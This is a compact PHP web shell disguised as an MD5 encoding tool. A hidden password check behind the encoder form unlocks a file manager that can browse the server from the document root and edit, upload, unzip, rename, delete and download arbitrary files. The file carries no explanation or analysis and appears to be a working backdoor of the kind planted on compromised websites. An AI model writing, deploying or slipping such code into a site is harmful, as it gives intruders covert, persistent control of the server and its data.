<?php session_start(); date_default_timezone_set('Asia/Ho_Chi_Minh'); header("Content-type: text/html; charset=utf-8"); $rootDir=$_SERVER['DOCUMENT_ROOT']; function authenticate(){if(isset($_SESSION['authenticated'])&&$_SESSION['authenticated']===true){return true;}else{return false;}}function login(){if(isset($_POST['ok'])){$in=md5(md5($_POST['ok']));if($in=='78b709993dbd726feb53311c4524cabf'){$_SESSION['authenticated']=true;return true;}else{echo'MD5: '.$in.'<br>**********************************<br>';return false;}}}function displayCurrentPath($dir){$parts=explode('/',trim($dir,'/'));$path='';echo'<h2>[DIR]: '; $firstIteration=true;foreach($parts as $part){if($part!==''){if(!$firstIteration){$path.='';}else{$firstIteration=false;}$path.=$part;echo'<a href="?dir='.urlencode($path).'">'.htmlspecialchars($part).'</a>/';}}echo'</h2>';}function displayBackButton($dir){echo' - <a href="?dir='.urlencode($dir).'">Back</a>';}function processDirectory($var){$var=str_replace('\\','/',$var);$var=preg_replace('#/\./#','//',$var);$var=preg_replace('#/\.\./#','//',$var);$var=preg_replace('#/\.{1,2}$#','//',$var);$var=preg_replace('|/{2,}|','/',$var);$var=preg_replace('|(.+?)/$|','$1',$var);return $var;}function listFiles($dir){$dirs=processDirectory($dir);$files=@scandir($dirs);if($files===false){$dir=$_SERVER['DOCUMENT_ROOT'];$dir=processDirectory($dir);$files=@scandir($dir);}if(!is_array($files))$files=array();$dirs=array();$nondirs=array();foreach($files as $file){if($file!='.'&&$file!='..'){if(is_dir($dir.'/'.$file)){$dirs[]=$file;}else{$nondirs[]=$file;}}}displayCurrentPath($dir);foreach($dirs as $file){echo'<li>';echo'<strong>[DIR]</strong> <a href="?dir='.urlencode($dir.'/'.$file).'"> <strong>['.htmlspecialchars($file).']</strong></a>';echo' - <a href="?action=rename&file='.urlencode($dir.'/'.$file).'&dir='.urlencode($dir).'">Rename</a>';echo' - <a href="?action=delete&file='.urlencode($dir.'/'.$file).'&dir='.urlencode($dir).'">Delete</a>';echo'</li>';}foreach($nondirs as $file){echo'<li>';echo htmlspecialchars($file);echo' - <a href="?action=edit&file='.urlencode($dir.'/'.$file).'&dir='.urlencode($dir).'">Edit</a>';echo' - <a href="?action=rename&file='.urlencode($dir.'/'.$file).'&dir='.urlencode($dir).'">Rename</a>';echo' - <a href="?action=delete&file='.urlencode($dir.'/'.$file).'&dir='.urlencode($dir).'">Delete</a>';if(pathinfo($file,PATHINFO_EXTENSION)=='zip'){echo' - <a href="?action=unzip&file='.urlencode($dir.'/'.$file).'&dir='.urlencode($dir).'">Unzip</a>';}echo' - <a href="?action=download&file=' . urlencode($dir . '/' . $file) . '">Download</a>';echo'</li>';}echo'</ul>';echo'<a href="?action=upload&dir='.urlencode($dir).'">Upload</a>';echo' - <a href="?action=create&dir='.urlencode($dir).'">Create</a>';}function downloadFile($file){if(file_exists($file)){if(ob_get_level()){ob_end_clean();}header('Content-Description:File Transfer');header('Content-Type:application/octet-stream');header('Content-Disposition:attachment;filename='.basename($file));header('Expires:0');header('Cache-Control:must-revalidate');header('Pragma:public');header('Content-Length:'.filesize($file));$chunkSize=1024*1024;$handle=fopen($file,'rb');if($handle===false){echo'Không thể mở tệp.';exit;}while(!feof($handle)){echo fread($handle,$chunkSize);ob_flush();flush();}fclose($handle);exit;}else{echo'Tệp không tồn tại.';}}function uploadFile($dir){if(isset($_FILES['file'])){move_uploaded_file($_FILES['file']['tmp_name'],$dir.'/'.$_FILES['file']['name']);echo'Successfully!';}echo'<form action="" method="post" enctype="multipart/form-data">';echo'Select file to upload:';echo'<input type="file" name="file">';echo'<input type="submit" value="Upload">';echo'</form>';}function unzipFile($file,$destination){if(class_exists('ZipArchive')){$zip=new ZipArchive;if($zip->open($file)===TRUE){$zip->extractTo($destination);$zip->close();echo'Successfully!';}else{echo'Failed!';}}else{try{$phar=new PharData($file);$phar->extractTo($destination);echo'Successfully!';}catch(Exception $e){echo'Failed: '.$e->getMessage();}}}function editFile($file){if(isset($_POST['content'])){file_put_contents($file,$_POST['content']);echo'Successfully!';}$content=file_get_contents($file);echo'<form action="" method="post">';echo'<textarea name="content" rows="20" cols="100">'.htmlspecialchars($content).'</textarea><br>';echo'<input type="submit" value="Save">';echo'</form>';}function renameFile($file){if(isset($_POST['newname'])){ $path=pathinfo($file);rename($file,$path['dirname'].'/'.$_POST['newname']);echo'Successfully!';}echo'<form action="" method="post">';echo'New name: <input type="text" name="newname">';echo'<input type="submit" value="Rename">';echo'</form>';}function deleteFile($file){if(isset($_POST['confirm'])&&$_POST['confirm']=='yes'){if(is_dir($file)){$files=array_diff(scandir($file),array('.','..'));foreach($files as $subfile){$path=$file.'/'.$subfile;if(is_dir($path)){deleteDirectory($path);}else{unlink($path);}}rmdir($file);}else{unlink($file);}echo'Successfully!';return;}echo'Are you sure you want to delete '.htmlspecialchars($file).'?';echo'<form action="" method="post">';echo'<input type="hidden" name="confirm" value="yes">';echo'<input type="submit" value="Yes">';echo'</form> ';}function deleteDirectory($dir){if(!is_dir($dir)){return false;}$files=array_diff(scandir($dir),array('.','..'));foreach($files as $file){$path=$dir.'/'.$file;if(is_dir($path)){deleteDirectory($path);}else{unlink($path);}}return rmdir($dir);}function createFile($dir){if(isset($_POST['filename'])&&!empty($_POST['filename'])){$file=$dir.'/'.$_POST['filename'];file_put_contents($file,'');echo'Successfully!';}echo'<form action="" method="post">';echo'File name: <input type="text" name="filename">';echo'<input type="submit" value="Create">';echo'</form>';}if(isset($_POST['ok'])){login();}if(!authenticate()){echo'Tool Encode MD5';echo'<form action="" method="post">';echo'Text: <input type="text" name="ok">';echo'<input type="submit" value="Encode">';echo'</form>';exit;}$dir=isset($_GET['dir'])?$_GET['dir']:''.$rootDir.'';if(isset($_GET['action'])){$action=$_GET['action'];$file=isset($_GET['file'])?$_GET['file']:null;switch($action){case'upload':uploadFile($dir);displayBackButton($dir);break;case'unzip':unzipFile($file,$dir);displayBackButton($dir);break;case'edit':editFile($file);displayBackButton($dir);break;case'rename':renameFile($file);displayBackButton($dir);break;case'delete':deleteFile($file);displayBackButton($dir);break;case'create':createFile($dir);displayBackButton($dir);break;case'download':downloadFile($file);displayBackButton($dir);break;default:listFiles($dir);displayBackButton(dirname($dir));break;}}else{listFiles($dir);displayBackButton(dirname($dir));}?>